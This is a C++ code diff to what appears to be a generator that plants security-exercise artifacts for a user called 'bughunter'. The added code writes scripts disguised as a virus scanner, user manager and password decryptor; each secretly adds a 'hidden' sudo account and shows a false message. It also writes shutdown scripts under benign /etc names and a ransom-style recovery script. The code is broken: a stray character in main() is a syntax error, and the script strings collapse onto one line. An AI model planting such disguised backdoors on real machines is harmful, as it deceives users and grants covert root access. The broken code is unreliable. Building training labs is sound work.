@@ -7,6 +7,8 @@
 #include <stdexcept>
 #include <string>
 #include <array>
+#include <filesystem>
+#include <random>
 #include <fstream>
 #include <memory>
 
@@ -65,22 +67,22 @@ std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits
                 //     objectives.push_back({"Cookies"});
                 //     break;
 
-                case 5: {
-                    u_long websiteID = std::bitset<2>(std::string(1, bitString.at(5)) + bitString.at(6)).to_ulong();
-                    std::string website = "";
+                // case 5: {
+                //     u_long websiteID = std::bitset<2>(std::string(1, bitString.at(5)) + bitString.at(6)).to_ulong();
+                //     std::string website = "";
 
-                    if (websiteID == 0) {
-                        website = "a";
-                    } else if (websiteID == 1) {
-                        website = "f";
-                    } else {
-                        website = "s";
-                    }
+                //     if (websiteID == 0) {
+                //         website = "a";
+                //     } else if (websiteID == 1) {
+                //         website = "f";
+                //     } else {
+                //         website = "s";
+                //     }
 
-                    objectives.push_back({"Phishing", website});
+                //     objectives.push_back({"Phishing", website});
                     
-                }
-                break;
+                // }
+                // break;
 
                 case 6: {
                     u_long shID = std::bitset<2>(std::string(1, bitString.at(6)) + bitString.at(7)).to_ulong();
@@ -133,11 +135,11 @@ std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits
                 }
                 break;
 
-                case 9: {
-                    objectives.push_back({"DDOS"});
+                // case 9: {
+                //     objectives.push_back({"DDOS"});
                     
-                }
-                break;
+                // }
+                // break;
 
                 case 10: {
                     objectives.push_back({"Worm"});
@@ -151,22 +153,22 @@ std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits
                 }
                 break;
 
-                case 12: {
-                    u_long appID = std::bitset<2>(std::string(1, bitString.at(12)) + bitString.at(13)).to_ulong();
-                    std::string app = "";
+                // case 12: {
+                //     u_long appID = std::bitset<2>(std::string(1, bitString.at(12)) + bitString.at(13)).to_ulong();
+                //     std::string app = "";
 
-                    if (appID == 0) {
-                        app = "P";
-                    } else if (appID == 1) {
-                        app = "R";
-                    } else {
-                        app = "X";
-                    }
+                //     if (appID == 0) {
+                //         app = "P";
+                //     } else if (appID == 1) {
+                //         app = "R";
+                //     } else {
+                //         app = "X";
+                //     }
 
-                    objectives.push_back({"Docker", app});
+                //     objectives.push_back({"Docker", app});
                     
-                }
-                break;
+                // }
+                // break;
 
                 case 13: {
                     u_long appID = std::bitset<3>(std::string(1, bitString.at(13)) + bitString.at(14) + bitString.at(15)).to_ulong();
@@ -209,11 +211,11 @@ std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits
                 }
                 break;
 
-                case 15: {
-                    objectives.push_back({"Passwords"});
+                // case 15: {
+                //     objectives.push_back({"Passwords"});
                     
-                }
-                break;
+                // }
+                // break;
 
                 default:
                     break;
@@ -228,22 +230,145 @@ std::vector<std::vector<std::string>> loopThroughObjectives(std::bitset<32> bits
 void handleObjectives(std::vector<std::vector<std::string>> objectives) {
     for (std::vector<std::string> objective: objectives) {
         std::string id = objective[0];
-        std::cout << id << std::endl;
-        if (id == "Rootkit") {
-            std::ofstream file("/home/bughunter/utils/vs.sh");
 
-            file << "if [ \"$EUID\" -ne 0 ]\nthen echo \"Please run as root!\"\nexit\nfi\necho \"Checking for viruses...\"\nsudo adduser \"-\" sudo\nprintf \"\\033c\"\necho \"None found!\"";
+        if (id == "Ransom") {
+            std::ofstream file("/home/bughunter/ssd-recovery/recover.sh");
+
+            file << "echo -n \"First number: \" \
+                    read num1 \
+                    if ! [[ \"$num1\" =~ \"" + objective[1] + "\" ]] \
+                            then \
+                                exit \
+                    fi \
+                    \
+                    echo -n \"Second number: \" \
+                    read num2 \
+                    if ! [[ \"$num2\" =~ \"" + objective[2] + "\" ]] \
+                            then \
+                                exit \
+                    fi \
+                    \
+                    echo -n \"Third number: \" \
+                    read num3 \
+                    if ! [[ \"$num3\" =~ \"" + objective[3] + "\" ]] \
+                            then \
+                                exit \
+                    fi \
+                    \
+                    \
+                    echo \"Recovered!\" \
+                    echo \"" + objective[1] + objective[2] + objective[3] + "\" > /home/bughunter/ssd-recovery/code.txt";
 
 
 
 
             file.close();
         }
+
+        if (id == "Virus") {
+            std::ofstream file;
+            if (objective[1] == "ci") {
+                file = std::ofstream("/etc/cisco-dark-mode.sh");
+            } else if (objective[1] == "ch") {
+                file = std::ofstream("/etc/Chrome-run.sh");
+            } else if (objective[1] == "cr") {
+                file = std::ofstream("/etc/Critical.sh");
+            } else if (objective[1] == "uo") {
+                file = std::ofstream("/etc/Update.sh");
+            }
+
+            file << "sudo shutdown -h now";
+
+            file.close();
+        }
+
+        if (id == "Trojan") {
+            if (objective[1] == "B") {
+                std::ofstream file("/usr/share/blender/scripts/startup/trojan.py");
+
+                file << "";
+
+                file.close();
+            } else {
+                std::ofstream file("/usr/share/virtualbox/trojan.sh");
+
+                file << "";
+
+                file.close();
+            }
+        }
+
+        if (id == "Rootkit") {
+            if (objective[1] == "V") {
+                std::ofstream file("/home/bughunter/utils/virusScanner.sh");
+
+                file << "if [ \"$EUID\" -ne 0 ] \
+                        then echo \"Please run as root\" \
+                        exit \
+                        fi \
+                        \
+                        echo \"Checking for viruses...\" \
+                        \
+                        sudo find virus \
+                        \
+                        sudo adduser \"hidden\" sudo \
+                        \
+                        printf \"\\033c\" \
+                        echo \"None found!\"";
+
+
+
+
+                file.close();
+            } else if (objective[1] == "T") {
+                std::ofstream file("/home/bughunter/utils/userManager.sh");
+
+                file << "if [ \"$EUID\" -ne 0 ] \
+                        then echo \"Please run as root\" \
+                        exit \
+                        fi \
+                        \
+                        sudo adduser \"hidden\" sudo \
+                        \
+                        printf \"\\033c\" \
+                        echo \"Found one user (you)\"";
+
+
+
+
+                file.close();
+            } else if (objective[1] == "P") {
+                std::ofstream file("/home/bughunter/utils/passwordDecryptor.sh");
+
+                file << "if [ \"$EUID\" -ne 0 ] \
+                    then echo \"Please run as root\" \
+                    exit \
+                    fi \
+                    \
+                    echo \"Decrypting...\" \
+                    \
+                    sudo adduser \"hidden\" sudo \
+                    \
+                    \
+                    printf \"\\033c\" \
+                    echo \"Failure to decrypt, try again later\"";
+
+
+
+
+                file.close();
+            }
+        }
     }
 }
 
 
 int main() {
-    handleObjectives(loopThroughObjectives(generateBinary(999999)));
+    int num = 1 + (std::rand() % (999999));
+
+    handleObjectives(loopThroughObjectives(generateBinary(num))a);
+
+
+
     return 0;
 }   
